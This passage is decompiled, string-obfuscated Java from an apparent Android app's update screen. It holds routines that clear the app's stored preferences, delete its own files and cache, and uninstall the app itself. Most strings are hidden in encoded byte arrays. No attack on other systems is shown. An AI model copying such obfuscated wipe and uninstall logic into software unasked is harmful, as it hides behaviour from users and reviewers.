                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i112 < length2) {
                                fileArrListFiles2[i112].delete();
                                i112++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i111 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i111, 6), ((long) i111) * 2000);
                            i111++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i112) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i111) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        this.f1688k.removeCallbacksAndMessages(null);
        C1407q.f3369f = true;
    }

    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    public final void onResume() {
        super.onResume();
        Button button = this.f1683f;
        if (button != null) {
            button.setEnabled(C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{14, -102, -56, -56, -105}, new byte[]{74, -54, -67, -72, -28, -127, 57, 42}), false));
        }
        C1407q.f3369f = false;
    }

    /* JADX INFO: renamed from: s */
    public final void m1600s(String str) {
        String str2 = f1678l;
        try {
            Log.e(str2, str + AbstractC1387m.m2421h(new byte[]{-73, 31}, new byte[]{-115, 63, -19, ByteCompanionObject.MAX_VALUE, 46, 17, -90, 82}) + AbstractC1387m.m2417d(this, str2).m2450a());
        } catch (Exception e) {
            Log.e(str2, str.concat(AbstractC1387m.m2421h(new byte[]{110, 11, 94, 20, 114, 22, -6, -8, 116, 95, 87, 85, 120, 22, -6, -3, 38, 11, 124, 16, 109, 19, -4, -7, 116, 100, 79, 27, 126, 8}, new byte[]{84, 43, 56, 117, 27, 122, -97, -100})), e);
        }
    }

    /* JADX INFO: renamed from: t */
    public final void m1601t() {
        new C1445y2(AbstractC1387m.m2421h(new byte[]{29, 67, -17, -18, -75, Base64.padSymbol, 44, 23, 68, 84, -7, -10, -1, Base64.padSymbol, 47, 2}, new byte[]{105, 38, -100, -102, -102, 92, 92, 103}), this);
    }
}
